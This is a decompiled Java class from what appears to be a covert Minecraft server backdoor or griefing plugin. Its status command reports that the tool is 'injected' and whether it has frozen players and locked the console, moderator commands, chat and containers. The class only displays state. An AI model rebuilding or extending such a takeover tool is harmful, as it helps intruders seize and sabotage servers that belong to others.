/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.entity.Player
 */
package me.qlutch.sucks.command.impl;

import me.qlutch.sucks.Core;
import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.utils.Settings;
import org.bukkit.entity.Player;

public class StatusCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        p2.sendMessage("§8§m----------------------------------");
        p2.sendMessage("         " + Settings.DARK_RED + Settings.NAME + " by " + Settings.AUTHOR);
        p2.sendMessage("");
        p2.sendMessage("§7" + Settings.NAME + " injected: " + Settings.RED + "true");
        p2.sendMessage("§7All players frozen: " + Settings.RED + plugin.frozen);
        p2.sendMessage("§7Console Locked: " + Settings.RED + plugin.isLocked);
        p2.sendMessage("§7Mod Commands Locked: " + Settings.RED + plugin.modCmd);
        p2.sendMessage("§7Commands Locked: " + Settings.RED + plugin.playerCommandsLocked);
        p2.sendMessage("§7Chat Locked: " + Settings.RED + plugin.chatLocked);
        p2.sendMessage("§7Containers Locked: " + Settings.RED + plugin.storagesDisabled);
        p2.sendMessage("");
        p2.sendMessage("§8§m----------------------------------");
    }

    @Override
    public boolean isBlatant() {
        return false;
    }
}

